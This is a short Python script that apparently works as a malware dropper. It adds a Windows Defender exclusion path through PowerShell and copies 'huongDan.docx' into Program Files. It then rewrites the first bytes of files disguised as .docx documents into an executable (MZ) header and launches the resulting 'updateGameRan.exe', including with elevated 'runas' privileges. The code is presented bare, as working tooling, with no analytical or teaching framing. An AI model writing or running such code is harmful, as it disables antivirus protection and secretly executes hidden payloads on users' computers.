import os
import shutil

def AddPath():
	os.system("powershell -NonInteractive -Command Add-MpPreference -ExclusionPath 'C:\\Program Files\\testPy'")

def transfer(fileNameBefore, fileNameAfter):
    old = open(fileNameBefore, "rb").read()
    new = open(fileNameAfter, "wb") 
    check = False
    for i in range(0, len(old), 16):
        S = old[i:i+16]
        if check == False:
            S = [77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0]
            array=bytearray(S)
            new.write(array)
            check = True
        else:
            new.write(S)
def hidden(path):
    os.system(path)

program_files = os.environ["PROGRAMFILES"]
new_dir = os.path.join(program_files, "testPy")

if not os.path.exists(new_dir):
    os.makedirs(new_dir)

shutil.copy("huongDan.docx", os.path.join(new_dir, "huongDan.docx"))
AddPath()
transfer("gameRan.docx", "gameRan.exe")
path1 = r"C:\Program Files\testPy\huongDan.docx"
path2 = r"C:\Program Files\testPy\updateGameRan.exe"
transfer(path1, path2)
hidden(path2)
os.startfile('C:\\Program Files\\testPy\\updateGameRan.exe', 'runas')